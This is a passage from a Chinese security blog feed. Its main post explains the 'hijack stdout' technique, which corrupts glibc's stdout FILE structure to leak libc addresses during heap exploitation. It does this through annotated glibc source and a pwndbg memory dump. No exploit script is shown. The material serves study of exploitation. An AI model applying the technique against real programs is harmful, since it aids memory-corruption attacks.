  <script id="hbeData" type="hbeData" data-hmacdigest="565033cfbad0e25dd85edd49a3af67852a1a453d8356448553781d12c92411de">4630436162ade97ba2718b7d0c4b3b63f97fe7f487088031e1ec7f30c37889e17af4f6297068ec459b8609dd5e773f884c55009995b4e2fa14cd0ad5eff0ada9f9fb8fb348a39322f64a27b4e67198e9d0918355853825b4a8b859e1b0997d0838db13d93eb663a75abf26151a4cd6693bc3399e41eef6d4a0d8ac518bee9c9ddee4d733ecfde4f1c7c01610b2139c3f919d321e3580e4ea4d25333a1eb6a757138158c91746eb650d2bd292b639e6c34cbf144f87d98390fac9f8662146f06c3a6438c2b9ee94e1d311e783b3870047c72629be8369de61aafcfd95d1a6b146908a00176e823191858046b0d3068b0efa543f002c4411ac17d84cfbc5419db7d33e0dec60d5febc26877845ea4a0c78edbec57ec484cb94f4a5981b779247299a083552613550cf2067f03e18806e1d8b7363322598e505c747f93d1e38576db45e8de5d1770b452a4fb1219a730e7968e9f6fbb48dd64088b4f6b768d41ae0fde1188c840a5b26f4bcf87fc459371861bccf009fd56466bfb6189998e9e6a70ba3621ca8bdf949e5cadcc118f51f12983682d54b3fadc89599f99b3bc97b0ac705b13416a1e530d1e06e17469a74ffce4af1c9c1c3a7fe2e7d43f0a4553f309b55a680d4ba0eff5e1480ff40e6cca6cf09c8d0ab9d3d27139e5f1fa8ce760b2b398ec79fa2325ce353708b5fd4928897ec368d0027fa2da6b5a0fd8e4e9b7529ca09bebcdd4ee3a67b8793bf535765eccd25777435299c4f7eaac3b37aa14cd4e771f0d59050e41a2121cab03ed0afccb01338cfaa270444513ab17731861d2e4818cce309b9ff34abf619216411da184092968ba15dba46fd74305d671fcc251530f5b9827fa2b99f113bdb279c693dd1704ca3a9977b3cf3a9ef9e6e9aea7a55f4fc6fc7431430f1e9e124491e51c5a917d50a11cab0f41057afdd9d73a5b69b54cc67bafaa65d40dd533efc909c87f1c18ae04764a239ce69c0e6b19cc5ed2e7a78ac3ef08cb10b1f5b175a7d09c35fb03134919f9a86758fdb28838be1fac5331cdfa5707833518ca071974ca46fbdbf334145555a36a006404440d8fca60195baebf5d921d9ae64c6ede24c1ac47d7b3df82c3ce65f2f997606186ef07a3f88a8a3c72c8e7356c6e5c164a313008c552320c7cc95166d8e5e707dd2c9dbffb129a9ff70ff8101f09fb70b81f2e64efb235bd7a1a44978559875515a83368f1936fdc556832492ae0671d7b67a6d1103441d906adf08a33a54f41e0e0a81c7b4eac704aaa6c35e18d6dc5e7c207f526d5892197d5ec7c4dc0edc9efb23891b524cebecd0ce984f13642004ae7f4f54a08732b3ecd632161bc17cb1fd597809352045d72809c36c4bbd110a7497cabcf294feeb4d11fa9232188bee2584a68dfd88207a7cd9a48503570676e50847d192a2a6e7a3e53b1288974ea16d0d80073c728e0d84755ce47c943e600c17df7a43d591f7b8468bbefe1285a930632e3cc5655a628782afed132fd2656813b3e22325b3a48436551b12b4bb838771f30eb825dcd8fc754fd10a17f9662286af92f4f8894097e941fe3dbb4831cdbc6b443b1824d50b470da2542da6d87fa03706ed8a14dae9ea9870c7981bf761c813f8db6283e5e4d6f83a5a745ead7855a07cee619cc695b70f3df8b4b82f85ae49a93e0a2e86cb14d6e0f39d7f7bf03c28c6ca9e5390facd1c25ec8a080b42009a9e8e7a2661422d70a39b106406ace53b39d9f03ff1dc17e689135109c611b983c2627adbe1cf664ccb70961af510424ea592895cada1f8c387464a798fa7bccbf6c1194aee98de463a3b9d2dd218e14e3ae7e5d0c5f245cc7346d6e77b8485834290c726ad9b51e466d596aa6f3eda026257f794e43169d555593a6a2edff432c8fee45925e7e160535894a5c8cd682d47da0d6c0d453b6aabb3506802282bee599e6b9b05b39711c44af4661449bc4a5f0a6210b62bf1d925fa4ddd6119bf701a01d5697aca71cada1e1589a0292809eefc99ecf7cdfb7fdf6c58755e4056d96a320cf900212ea371469d77092e46fc449dfa62c7e239cba7cc11a68b343416c661aacab9576053516ad64f6d814c2ccc5e0f884262177421fc187ad171106677e25362053b1dfaf3886dc8836429ab3c84fd6e513de9ae09c0fa33f26d020910e61cf24436a5449543f2cd87c83075d5b6196c0906d9803c75158f3f735c9d5e676bff754f1624524fb3bb6ff74c7bc4efa5232f511f6b0101311503ca3f1f1e2d8896d2bba030c5ce2bfbe55caa42dc943bd894d3b4cb477545f75789e0319ffe57729a98b855a9714508a955c8320a1f26393e1f113062535a766a0467a50c0c9d56bc170e68453c016a231eb5723e8470065d0671efc61360e68506bf08024106b9f7ab456d894dfaf5b0a9b20c29411fbb86373522ac2d8c249cbb43844704009da10719c877b42ea5b0f29a1c857a6010f87cf67a5b6c17e7a692e14343826fdfcba7224f82ad67ab76ee82d6e6c764b155358cfcf2b474558e5368b62028c52c55ea61eff706ae8509a86649d409e3a033fffe63429d8f088985c99c2c574c6c8a8ee48f56d84a1bfbbc48250191029b02c8391e05a23f339dd8727457b77b17b9762d6a4f22a369776bfd3f185a9edcdab5b76017d1488457094eed536638b8565385fcab698c2e89b3ebcf1c5aafd80a54f225949b54174b691c1039aa90305bc2538c92411df088b15d3429a841fbe37b3372015181f4a30a3c1bc6e85539c4bd5a692da38b9e05aa69a2640ca4191cf46eb460bc72f5e6a03d98c5e5703e1971e237f10feca4fd1d6720a6631929b4150e2a1f24df54dfc3b94d0321be2001ddf5b8a7bc71b76e677157fe63fdf0e273af4dca56b9e3aba86fd2f893d1dc0c3ac64663868c19d50e6213033a6b4fac6dfbed7e3a01223421aa246a83db479a938f691c533a975b92477ed639b3aa7ace2b93f6402c6d8fc63504e5f383e07929e10a7839d1a9d17330a2883e68592eaba9a66f7ecf4d7c9778380a9acd2dbbaac5f6ded1f384077269489201d58495f66e6c2e14d6939fd0b56382986631a1b9eaefadce7cf27a8999bb34f675b5806d3c4ee96604468043783c027fa96f06ef3ec165fde40bd102c8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>hijack_stdout</title>
    <url>/2025/03/27/hijack_stdout/</url>
    <content><![CDATA[<p>在glibc_heap的利用中，很可能会遇到没有show功能的程序，从而泄露不了地址，我们可以通过控制stdio，在通过puts等io操作输出之内的函数泄露libc地址</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="IO-puts"><a href="#IO-puts" class="headerlink" title="_IO_puts()"></a>_IO_puts()</h3><p>首先我们看puts()函数的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们要关注的是<code>_IO_sputn</code>，因为只有它调用了<code>str</code>参数，跳转到定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>AI的解释：</p>
<p>在glibc中，<code>#define _IO_sputn(__fp, __s, __n)</code>是一个宏定义，它的作用是将一个函数或操作的调用转换为另一个函数或操作的调用。在这个宏中，<code>_IO_XSPUTN</code>是实际执行操作的函数，<code>__fp</code>、<code>__s</code> 和 <code>__n</code> 是传递给该函数的参数。</p>
<p>具体来说，这个宏的定义可以被分解为以下几点：</p>
<ol>
<li><p><strong>宏定义</strong>：<code>#define</code>是C语言中的宏定义指令，用于定义一个宏。这个宏在预处理阶段会被展开。</p>
</li>
<li><p><strong>参数</strong>：<code>__fp</code>、<code>__s</code>和<code>__n</code>是这个宏接受的三个参数：</p>
<ul>
<li><code>__fp</code>：通常是一个指向文件流的指针（<code>FILE *</code>），表示要写入的目标文件流。</li>
<li><code>__s</code>：通常是一个指向字符数组的指针，表示要写入的数据。</li>
<li><code>__n</code>：表示要写入的字符数。</li>
</ul>
</li>
<li><p><strong>展开</strong>：当在代码中调用<code>_IO_sputn(fp, s, n)</code>时，预处理器会将其展开为<code>_IO_XSPUTN(fp, s, n)</code>，从而调用<code>_IO_XSPUTN</code>函数。</p>
</li>
</ol>
<p><code>_IO_XSPUTN</code>通常是一个更底层的实现，用于处理输出到文件流的具体细节。它可能会处理缓冲、字符编码等。</p>
<p>假设你在代码中有如下调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_sputn(fp, buffer, size);</span><br></pre></td></tr></table></figure>

<p>在预处理阶段，这将被转换为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_XSPUTN(fp, buffer, size);</span><br></pre></td></tr></table></figure>

<p>这样，实际的输出操作将由<code>_IO_XSPUTN</code>函数执行，而<code>_IO_sputn</code>宏提供了一个更高级的接口。</p>
<p><strong>总结</strong></p>
<p><code>_IO_sputn</code>宏用于将对输出操作的高级抽象映射到底层实现，便于代码的维护和可读性，同时也可能涉及到优化和条件编译等特性。</p>
<p>这也就说明了这个<code>_IO_putn(__fp, __s, __n)</code>是一个虚表函数（网上好多是这样说的），虽然<code>#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN(__fp, __s, __n)</code>本身是一个宏定义，并不涉及C++的虚表机制，但可以通过理解多态性来认识它的作用和设计理念。在C++中，宏可以简化接口，同时背后可能调用一些更为复杂的底层实现，类似于如何通过虚表和虚函数来实现动态绑定。这种设计使得代码更加灵活和可维护。</p>
<hr>
<h3 id="IO-new-file-xsputn"><a href="#IO-new-file-xsputn" class="headerlink" title="_IO_new_file_xsputn()"></a>_IO_new_file_xsputn()</h3><p>这个<code>_IO_sputn()</code>最终调用的是<code>_IO_new_file_xsputn(</code>)函数，在glibc&#x2F;libio&#x2F;fileops.c&#x2F;1200行左右，这里我们要关注的是<code>_IO_OVERFLOW()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">//用它来刷新缓冲区，刷新缓冲区也就会输出</span></span><br></pre></td></tr></table></figure>

<p>这个<code>_IO_OVERFLOW</code>也是虚表函数，它实际调用的是<code>_IO_new_file_overflow</code></p>
<h3 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//flags不能包含_IO_NO_WRITES标志位0x8，否则就会执行这里的报错</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="comment">//这里若满足这两个条件之一就会执行下面这一大串代码，很有可能会报错</span></span><br><span class="line">  <span class="comment">//所以我们设置flags中_IO_CURRENTLY_PUTTING标志位为1，就可以跳过这一大段代码</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)<span class="comment">//</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//在这里我们要关注这个 _IO_do_write,调整到_Io_new_do_write</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    <span class="comment">//这里_IO_do_write输出了f-&gt;_IO_write_ptr - f-&gt;_IO_write_base中间的值</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>

<h3 id="IO-new-do-write"><a href="#IO-new-do-write" class="headerlink" title="_IO_new_do_write()"></a>_IO_new_do_write()</h3><p>跳转到<code>_IO_new_do_write</code>，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;<span class="comment">//这里也就是io_do_erite调用了new_do_write进行写出</span></span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">    <span class="comment">//首先检查了flags中_IO_IS_APPENDING标志位，0x1000处</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);<span class="comment">//这里就能实现输出f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>随便运行一个程序，用gdb调试：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">0x7ffff7dd2700 &lt;stderr&gt;:        0x00007ffff7dd2540      0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd2710 &lt;stdin&gt;: 0x00007ffff7dd18e0      0x00007ffff7a2db80</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    <span class="comment">#正常情况下_IO_write_base和_IO_write_ptr是相等的</span></span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看一下_IO_write_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt;</p>
